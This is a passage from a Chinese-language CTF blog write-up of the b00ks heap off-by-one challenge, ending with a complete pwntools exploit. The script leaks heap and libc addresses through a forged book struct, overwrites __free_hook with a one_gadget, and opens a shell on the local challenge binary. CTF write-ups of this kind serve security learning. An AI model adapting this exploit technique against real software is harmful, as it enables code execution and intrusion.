+<h3 id="EnterAuthName"><a href="#EnterAuthName" class="headerlink" title="EnterAuthName()"></a>EnterAuthName()</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">signed</span> __int64 <span class="title">EnterAuthName</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter author name: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">input_BUG</span>(AuthorName, <span class="number">32</span>) )<span class="comment">//AuthorName offset_0x202018</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fail to read author_name&quot;</span>, <span class="number">32LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行后通过input_BUG输入作者名。作者名被存入bss段，距离基地址偏移0x202018个字节。</p>
+<h2 id="对接"><a href="#对接" class="headerlink" title="对接"></a>对接</h2><p>了解完所有的函数之后，对于菜单类程序我们最好写一些操作函数来对接程序方便攻击。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">OptionNum=<span class="number">0</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;</span>)</span><br><span class="line">res=process(<span class="string">&#x27;./&#x27;</span>+Path)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CreateBook</span>(<span class="params">NameSize,name,DesSize,description</span>):</span><br><span class="line">    res.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    res.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    res.recvuntil(<span class="string">&#x27;name size:&#x27;</span>)</span><br><span class="line">    res.sendline(<span class="built_in">str</span>(NameSize))</span><br><span class="line">    res.recvuntil(<span class="string">&#x27;chars):&#x27;</span>)</span><br><span class="line">    res.sendline(name)</span><br><span class="line">    res.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    res.sendline(<span class="built_in">str</span>(DesSize))</span><br><span class="line">    res.recvuntil(<span class="string">&#x27;description:&#x27;</span>)</span><br><span class="line">    res.sendline(description)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DeleteBook</span>(<span class="params">BookId</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Deleting...&quot;</span>)</span><br><span class="line">    res.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    res.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    res.recvuntil(<span class="string">&#x27;delete: &#x27;</span>)</span><br><span class="line">    res.sendline(<span class="built_in">str</span>(BookId))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">EditBook</span>(<span class="params">BookId,description</span>):</span><br><span class="line">    res.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    res.recvuntil(<span class="string">&#x27;edit: &#x27;</span>)</span><br><span class="line">    res.sendline(<span class="built_in">str</span>(BookId))</span><br><span class="line">    res.recvuntil(<span class="string">&#x27;description: &#x27;</span>)</span><br><span class="line">    res.sendline(description)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ChangeAuthName</span>(<span class="params">name</span>):</span><br><span class="line">    res.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    res.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    res.recv()</span><br><span class="line">    res.sendline(name)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ShowBooks</span>():</span><br><span class="line">    res.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    res.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="深入分析"><a href="#深入分析" class="headerlink" title="深入分析"></a>深入分析</h2><p>作者名先输入个N0P3aaaa</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/OffbyOne/%E6%88%AA%E5%B1%8F2020-10-19%20%E4%B8%8B%E5%8D%8812.27.03.png" alt="截屏2020-10-19 下午12.27.03"></p>
+<p>作者名的输入调用了前面的讲过的EnterAuthName()函数，此时的作者名被存入AuthorName。</p>
+<p>ctrl+c再vmmap看一下</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/OffbyOne/%E6%88%AA%E5%B1%8F2020-10-19%20%E4%B8%8B%E5%8D%8812.30.00.png" alt="截屏2020-10-19 下午12.30.00"></p>
+<p>基地址就是最上面的红色地址 0x555555754000。加上AuthorName的偏移就可以找到N0P3aaaa在内存中的位置。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/OffbyOne/%E6%88%AA%E5%B1%8F2020-10-19%20%E4%B8%8B%E5%8D%881.12.25.png" alt="截屏2020-10-19 下午1.12.25"></p>
+<p>第一行指向了数据的地址，也就是0x55555756040，这也是个地址只向第三行的右侧。</p>
+<p>输入作者名函数是调用了input_BUG的，所以也存在可以多写入一个字符的问题。我们来测试一下</p>
+<h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">OptionNum=<span class="number">0</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;</span>)</span><br><span class="line">res=process(<span class="string">&#x27;./&#x27;</span>+Path)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CreateBook</span>(<span class="params">NameSize,name,DesSize,description</span>):</span><br><span class="line">    res.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    res.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    res.recvuntil(<span class="string">&#x27;name size:&#x27;</span>)</span><br><span class="line">    res.sendline(<span class="built_in">str</span>(NameSize))</span><br><span class="line">    res.recvuntil(<span class="string">&#x27;chars):&#x27;</span>)</span><br><span class="line">    res.sendline(name)</span><br><span class="line">    res.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    res.sendline(<span class="built_in">str</span>(DesSize))</span><br><span class="line">    res.recvuntil(<span class="string">&#x27;description:&#x27;</span>)</span><br><span class="line">    res.sendline(description)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DeleteBook</span>(<span class="params">BookId</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Deleting...&quot;</span>)</span><br><span class="line">    res.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    res.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    res.recvuntil(<span class="string">&#x27;delete: &#x27;</span>)</span><br><span class="line">    res.sendline(<span class="built_in">str</span>(BookId))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">EditBook</span>(<span class="params">BookId,description</span>):</span><br><span class="line">    res.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    res.recvuntil(<span class="string">&#x27;edit: &#x27;</span>)</span><br><span class="line">    res.sendline(<span class="built_in">str</span>(BookId))</span><br><span class="line">    res.recvuntil(<span class="string">&#x27;description: &#x27;</span>)</span><br><span class="line">    res.sendline(description)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ChangeAuthName</span>(<span class="params">name</span>):</span><br><span class="line">    res.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    res.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    res.recv()</span><br><span class="line">    res.sendline(name)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ShowBooks</span>():</span><br><span class="line">    res.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    res.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">res.recvuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">res.sendline(<span class="string">&#x27;N0P3aaaabbbbbbbbccccccccdddddddd&#x27;</span>)</span><br><span class="line">CreateBook(<span class="number">128</span>,<span class="string">&quot;n0p3_book1&quot;</span>,<span class="number">32</span>,<span class="string">&#x27;n0p3_des&#x27;</span>)</span><br><span class="line">CreateBook(<span class="number">0x21000</span>,<span class="string">&quot;n0p3_book2&quot;</span>,<span class="number">0x21000</span>,<span class="string">&quot;n0p3_des&quot;</span>)</span><br><span class="line">book1_addr=ShowBooks()</span><br><span class="line">book1_addr=u64(book1_addr[<span class="number">85</span>:<span class="number">91</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(book1_addr))</span><br><span class="line">fake_book1 = p64(<span class="number">1</span>) + p64(book1_addr + <span class="number">0x38</span>) + p64(book1_addr + <span class="number">0x40</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">EditBook(<span class="number">1</span>,fake_book1)</span><br><span class="line">ChangeAuthName(<span class="string">&quot;N0P3aaaabbbbbbbbccccccccdddddddd&quot;</span>)</span><br><span class="line">Raw=ShowBooks()</span><br><span class="line"><span class="built_in">print</span>(Raw)</span><br><span class="line">book2_name_addr=u64(Raw[<span class="number">12</span>:<span class="number">18</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NameAddr: &quot;</span>+<span class="built_in">hex</span>(book2_name_addr))</span><br><span class="line">book2_desc_addr=u64(Raw[<span class="number">32</span>:<span class="number">38</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;DescAddr: &quot;</span>+<span class="built_in">hex</span>(book2_desc_addr))</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-v&#x27;]</span></span><br><span class="line"><span class="comment">#gdb.attach(res)</span></span><br><span class="line"><span class="comment">#print(hex(book2_desc_addr-0x00007ffff79e4000))#0x5b1010</span></span><br><span class="line">libc_addr=book2_desc_addr-<span class="number">0x5b1010</span><span class="comment">#取得libc基地址</span></span><br><span class="line">free_hook=libc_addr+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;free_hook:&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">MagicShell=libc_addr+<span class="number">0x4f3c2</span></span><br><span class="line">EditBook(<span class="number">1</span>,p64(free_hook))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Free_hook done&quot;</span>)</span><br><span class="line">res.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">EditBook(<span class="number">2</span>,p64(MagicShell))</span><br><span class="line">DeleteBook(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Shell:&quot;</span>)</span><br><span class="line">res.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/PWN/">#PWN</a> <a href="/tags/heap/">#heap</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    This theme was developed by <a target="_blank" rel="noopener" href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2020/10/28/BuuWeb1/">BuuWeb1</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2020/10/18/Off-by-one/">Asis_ctf_2016_b00ks</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2020/08/10/Xctf2/">XCTF-Pwn-Advance-2</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2020/07/17/BuuCtf1/">「BuuCTF」Part I</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
+    <h2>Categories</h2>
+    <ul>
+        
+        <li>
+            <a class="footer-post" href="/categories/CTF%E8%A7%A3%E9%A2%98/">CTF解题</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/CTF%E8%A7%A3%E9%A2%98/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://github.com/klugjo/hexo-theme-alpha-dust">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://twitter.com/?lang=en">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://www.facebook.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://www.instagram.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://dribbble.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://telegram.org/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-telegram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://www.behance.net/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-behance"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://500px.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-500px"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:test@example.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="\#">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    @Untitled. All right reserved | Design & Hexo <a target="_blank" rel="noopener" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+
+<script src="/js/main.js"></script>
+
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
